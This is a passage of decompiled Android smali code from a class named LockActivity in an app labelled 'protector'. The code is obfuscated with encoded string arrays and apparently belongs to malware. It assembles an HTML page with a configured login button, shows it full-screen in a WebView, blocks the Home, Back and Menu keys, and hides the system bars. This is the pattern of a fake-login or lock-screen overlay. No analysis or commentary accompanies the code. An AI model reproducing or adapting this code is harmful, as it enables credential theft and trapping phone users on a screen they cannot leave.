    invoke-static {v13, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_c

    move v5, v14

    goto :goto_5

    :pswitch_1
    new-array v13, v2, [B

    const/16 v15, 0x29

    aput-byte v15, v13, v5

    new-array v5, v9, [B

    fill-array-data v5, :array_17

    invoke-static {v13, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_c

    move v5, v3

    goto :goto_5

    :pswitch_2
    new-array v13, v2, [B

    const/16 v15, -0x7d

    aput-byte v15, v13, v5

    new-array v5, v9, [B

    fill-array-data v5, :array_18

    invoke-static {v13, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v12, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_c

    move v5, v2

    goto :goto_5

    :pswitch_3
    new-array v13, v2, [B

    const/16 v15, -0x7a

    aput-byte v15, v13, v5

    new-array v15, v9, [B

    fill-array-data v15, :array_19

    invoke-static {v13, v15}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_c

    goto :goto_5

    :cond_c
    :goto_4
    const/4 v5, -0x1

    :goto_5
    const/16 v13, 0x9

    if-eqz v5, :cond_10

    if-eq v5, v2, :cond_f

    if-eq v5, v3, :cond_e

    if-eq v5, v14, :cond_d

    const/16 v1, 0x11

    new-array v1, v1, [B

    fill-array-data v1, :array_1a

    new-array v2, v9, [B

    fill-array-data v2, :array_1b

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto :goto_7

    :cond_d
    sget-object v1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    const/16 v3, 0xe

    new-array v3, v3, [B

    fill-array-data v3, :array_1c

    new-array v5, v9, [B

    fill-array-data v5, :array_1d

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    :goto_6
    invoke-static {v1, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    goto :goto_7

    :cond_e
    sget-object v1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    new-array v3, v13, [B

    fill-array-data v3, :array_1e

    new-array v5, v9, [B

    fill-array-data v5, :array_1f

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v1, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_20

    new-array v3, v9, [B

    fill-array-data v3, :array_21

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    goto :goto_7

    :cond_f
    sget-object v1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    const/16 v3, 0xc

    new-array v3, v3, [B

    fill-array-data v3, :array_22

    new-array v5, v9, [B

    fill-array-data v5, :array_23

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    goto :goto_6

    :cond_10
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v2

    new-instance v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xr;

    invoke-direct {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xr;-><init>()V

    invoke-interface {v2, v3}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    :goto_7
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-array v3, v14, [B

    fill-array-data v3, :array_24

    new-array v5, v9, [B

    fill-array-data v5, :array_25

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Lcom/icontrol/protector/LockActivity;->e(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x7

    new-array v3, v3, [B

    fill-array-data v3, :array_26

    new-array v5, v9, [B

    fill-array-data v5, :array_27

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    new-array v3, v13, [B

    fill-array-data v3, :array_28

    new-array v5, v9, [B

    fill-array-data v5, :array_29

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    iget-object v3, v0, Lcom/icontrol/protector/LockActivity;->b:Ljava/lang/String;

    invoke-virtual {v2, v3, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    new-array v3, v10, [B

    fill-array-data v3, :array_2a

    new-array v5, v9, [B

    fill-array-data v5, :array_2b

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    new-array v2, v13, [B

    fill-array-data v2, :array_2c

    new-array v3, v9, [B

    fill-array-data v3, :array_2d

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    new-array v2, v10, [B

    fill-array-data v2, :array_2e

    new-array v3, v9, [B

    fill-array-data v3, :array_2f

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v7

    const/4 v6, 0x0

    new-array v1, v13, [B

    fill-array-data v1, :array_30

    new-array v2, v9, [B

    fill-array-data v2, :array_31

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v1, v10, [B

    fill-array-data v1, :array_32

    new-array v2, v9, [B

    fill-array-data v2, :array_33

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x0

    move-object v5, v4

    invoke-virtual/range {v5 .. v10}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_8

    :catch_3
    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->finish()V

    :goto_8
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x30
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x61t
        0x17t
        -0x2et
        -0x4bt
        -0x31t
        -0x30t
        -0x35t
        0xbt
        0x47t
        0x4t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x22t
        0x76t
        -0x42t
        -0x27t
        -0x73t
        -0x4ft
        -0x58t
        0x60t
    .end array-data

    :array_2
    .array-data 1
        0x65t
        -0x56t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x48t
        -0x65t
        -0x4ct
        -0xet
        0x45t
        0x63t
        -0x79t
        -0x49t
    .end array-data

    :array_4
    .array-data 1
        0x57t
        -0x2ft
        -0x9t
        0x71t
        0x61t
        0x3et
        0x2t
        0x6at
        0x6dt
        -0x3at
        -0x9t
        0x71t
        0x65t
        0x3ft
        0x4et
        0x3ft
        0x6et
        -0x25t
        -0x1bt
        0x71t
        0x65t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x1et
        -0x41t
        -0x7ct
        0x5t
        0x0t
        0x52t
        0x6et
        0x4at
    .end array-data

    :array_6
    .array-data 1
        0x8t
        0x3ct
        -0x1at
        -0x66t
        -0x61t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x6et
        0x5dt
        -0x76t
        -0x17t
        -0x6t
        -0xbt
        0xat
        -0x7ft
    .end array-data

    :array_8
    .array-data 1
        -0x22t
        -0x7dt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x5ct
        -0x15t
        0x5et
        0x57t
        0x36t
        -0x3et
        -0xct
        0x5ft
    .end array-data

    :array_a
    .array-data 1
        0x47t
        0x6ct
    .end array-data

    nop

    :array_b
    .array-data 1
        0x21t
        0x1et
        -0x58t
        -0x20t
        0x73t
        0x37t
        0x30t
        0x3dt
    .end array-data

    :array_c
    .array-data 1
        -0x2et
        -0x7t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x49t
        -0x69t
        -0x6et
        -0x57t
        0xbt
        -0x21t
        0x69t
        0x47t
    .end array-data

    :array_e
    .array-data 1
        0x0t
        0x5dt
        0x6dt
        0x58t
        0x4et
        -0x2bt
        0x2at
        0x5bt
        0x70t
        0x79t
        0x6ct
        0x59t
        0x56t
        -0x38t
        0x79t
    .end array-data

    :array_f
    .array-data 1
        0x50t
        0x3ct
        0x1et
        0x2bt
        0x39t
        -0x46t
        0x58t
        0x3ft
    .end array-data

    :array_10
    .array-data 1
        -0x3t
        0x36t
        -0xet
        -0x44t
        0x46t
        -0x32t
        -0x7et
        -0x72t
        -0x23t
        0x64t
        -0x13t
        -0x4at
        0x47t
        -0x64t
        -0x3at
        -0x71t
        -0x68t
        0x34t
        -0x1ft
        -0x56t
        0x40t
        -0x27t
        -0x7dt
    .end array-data

    :array_11
    .array-data 1
        -0x48t
        0x44t
        -0x80t
        -0x27t
        0x33t
        -0x44t
        -0x5et
        -0x16t
    .end array-data

    :array_12
    .array-data 1
        0x30t
        0x7et
        -0x6ft
        -0x11t
        -0x53t
        -0x45t
        -0x39t
        0x60t
        0x4ct
        0x39t
        -0x48t
        -0x59t
        0x2ct
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x2bt
        -0x2ft
        0x17t
        0x8t
        0xdt
        0x3at
        0x2et
        -0xct
    .end array-data

    :array_14
    .array-data 1
        0x30t
        0x0t
        -0x74t
        0x6dt
        -0x15t
        0x22t
        -0x5bt
        -0x24t
        0x40t
        0x24t
        -0x73t
        0x6ct
        -0xdt
        0x3ft
        -0xat
    .end array-data

    :array_15
    .array-data 1
        0x60t
        0x61t
        -0x1t
        0x1et
        -0x64t
        0x4dt
        -0x29t
        -0x48t
    .end array-data

    :array_16
    .array-data 1
        0x3t
        0x60t
        0x56t
        0x23t
        -0x71t
        0x23t
        0x16t
        -0x6et
    .end array-data

    :array_17
    .array-data 1
        0x1bt
        0x62t
        0xet
        -0x65t
        -0x6et
        -0x7bt
        0x7et
        -0x61t
    .end array-data

    :array_18
    .array-data 1
        -0x4et
        -0x26t
        0x9t
        0x27t
        -0x27t
        -0x67t
        -0x12t
        -0x2bt
    .end array-data

    :array_19
    .array-data 1
        -0x4at
        0x55t
        0x2t
        -0x1dt
        0x1at
        0x29t
        0x45t
        -0x60t
    .end array-data

    :array_1a
    .array-data 1
        0x31t
        0x11t
        0x6at
        0xft
        0x7et
        -0x5at
        -0x5ct
        0x4dt
        0x8t
        0x10t
        0x62t
        0xat
        0x31t
        -0x5bt
        -0x4dt
        0x1dt
        0x1t
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x64t
        0x7ft
        0x1t
        0x61t
        0x11t
        -0x2ft
        -0x36t
        0x6dt
    .end array-data

    :array_1c
    .array-data 1
        -0x27t
        0x3bt
        0x0t
        0x68t
        -0x72t
        -0x1ct
        -0x6ct
        0x43t
        -0x11t
        0x26t
        0x3t
        0x62t
        -0x72t
        -0x60t
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x64t
        0x55t
        0x74t
        0xdt
        -0x4t
        -0x3ct
        -0x3ct
        0x22t
    .end array-data

    :array_1e
    .array-data 1
        -0x27t
        -0x78t
        0xat
        -0x7t
        -0x1ct
        -0x8t
        -0x42t
        0x50t
        -0x2et
    .end array-data

    nop

    :array_1f
    .array-data 1
        -0x64t
        -0x1at
        0x7et
        -0x64t
        -0x6at
        -0x28t
        -0x12t
        0x19t
    .end array-data

    :array_20
    .array-data 1
        -0x2t
        -0x5et
        0x5et
        0x50t
    .end array-data

    :array_21
    .array-data 1
        -0x76t
        -0x30t
        0x2bt
        0x35t
        -0x65t
        0x60t
        -0x47t
        -0x41t
    .end array-data

    :array_22
    .array-data 1
        -0x44t
        -0x52t
        0x6bt
        -0x1ft
        -0x1bt
        -0x67t
        0x33t
        -0x41t
        -0x74t
        -0x47t
        0x78t
        -0x8t
    .end array-data

    :array_23
    .array-data 1
        -0x8t
        -0x24t
        0xat
        -0x6at
        -0x3bt
        -0x17t
        0x52t
        -0x35t
    .end array-data

    :array_24
    .array-data 1
        -0x6at
        -0x7t
        -0x21t
    .end array-data

    :array_25
    .array-data 1
        -0x48t
        -0x65t
        -0x55t
        -0x20t
        -0x6ct
        0x35t
        0x2at
        -0x10t
    .end array-data

    :array_26
    .array-data 1
        -0x69t
        -0x3ft
        -0x27t
        -0x12t
        0x5dt
        0x76t
        -0x79t
    .end array-data

    :array_27
    .array-data 1
        -0x34t
        -0x6bt
        -0x70t
        -0x46t
        0x11t
        0x33t
        -0x26t
        -0xat
    .end array-data

    :array_28
    .array-data 1
        -0x64t
        0x79t
        -0x48t
        -0x27t
        -0x22t
        0x2dt
        -0x3dt
        0x19t
        -0x66t
    .end array-data

    nop

    :array_29
    .array-data 1
        -0x39t
        0x29t
        -0x7t
        -0x76t
        -0x73t
        0x7at
        -0x74t
        0x4bt
    .end array-data

    :array_2a
    .array-data 1
        0x13t
        -0x4et
        -0xat
        -0x75t
        0x41t
    .end array-data

    nop

    :array_2b
    .array-data 1
        0x48t
        -0xat
        -0x41t
        -0x28t
        0x1ct
        0x74t
        -0x32t
        -0xbt
    .end array-data

    :array_2c
    .array-data 1
        -0x7bt
        0x35t
        -0x5et
        0x7at
        -0x77t
        0x12t
        0x4t
        -0x4ft
        -0x63t
    .end array-data

    nop

    :array_2d
    .array-data 1
        -0x2bt
        0x7ct
        -0x14t
        0x36t
        -0x34t
        0x5ct
        0x43t
        -0x1bt
    .end array-data

    :array_2e
    .array-data 1
        -0x55t
        0xft
        -0x4dt
        -0x7et
        0x38t
    .end array-data

    nop

    :array_2f
    .array-data 1
        -0x10t
        0x4dt
        -0x19t
        -0x34t
        0x65t
        0x15t
        0x13t
        -0x35t
    .end array-data

    :array_30
    .array-data 1
        0x70t
        -0x31t
        0x4t
        0x53t
        -0x2et
        -0x2t
        0x56t
        0x75t
        0x68t
    .end array-data

    nop

    :array_31
    .array-data 1
        0x4t
        -0x56t
        0x7ct
        0x27t
        -0x3t
        -0x6at
        0x22t
        0x18t
    .end array-data

    :array_32
    .array-data 1
        0x66t
        -0x35t
        0x18t
        0x6ct
        0x34t
    .end array-data

    nop

    :array_33
    .array-data 1
        0x33t
        -0x61t
        0x5et
        0x41t
        0xct
        -0x16t
        -0x54t
        0x7dt
    .end array-data
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/LockActivity;->c:Lcom/icontrol/protector/LockActivity;

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x3

    const/4 v0, 0x1

    if-ne p1, p2, :cond_0

    return v0

    :cond_0
    const/4 p2, 0x4

    if-ne p1, p2, :cond_1

    return v0

    :cond_1
    const/16 p2, 0x52

    if-ne p1, p2, :cond_2

    return v0

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method

.method public onWindowFocusChanged(Z)V
    .locals 1

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-eqz p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/Window;->getDecorView()Landroid/view/View;

    move-result-object p1

    const/16 v0, 0x1006

    invoke-virtual {p1, v0}, Landroid/view/View;->setSystemUiVisibility(I)V

    :cond_0
    return-void
.end method
